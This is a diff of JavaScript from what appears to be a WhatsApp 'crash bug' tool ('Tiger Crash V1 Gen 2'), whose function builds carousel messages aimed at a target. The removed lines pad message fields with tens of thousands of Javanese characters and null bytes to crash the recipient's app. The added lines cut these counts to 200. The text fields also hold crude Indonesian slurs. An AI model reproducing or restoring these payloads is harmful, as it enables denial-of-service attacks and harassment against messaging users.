@@ -33,13 +33,13 @@ async function carouselNew(isTarget, rikz) {
   for (let i = 0; i < 10; i++) {
     push.push({
       body: {
-        text: "CikssXyz" + "ꦾ".repeat(11000)
+        text: "CikssXyz" + "ꦾ".repeat(200)
       },
       footer: {
         text: "dont panic!!"
       },
       header: {
-        title: 'memekk' + "\u0000".repeat(50000),
+        title: 'memekk' + "\u0000".repeat(200),
         hasMediaAttachment: true,
         imageMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?...",
@@ -73,7 +73,7 @@ async function carouselNew(isTarget, rikz) {
         },
         interactiveMessage: {
           body: {
-            text: "Kontol " + "ꦾ".repeat(55000)
+            text: "Kontol " + "ꦾ".repeat(200)
           },
           footer: {
             text: "( 🐉 ) Tiger Crash V1 Gen 2 ( 🐉 )"
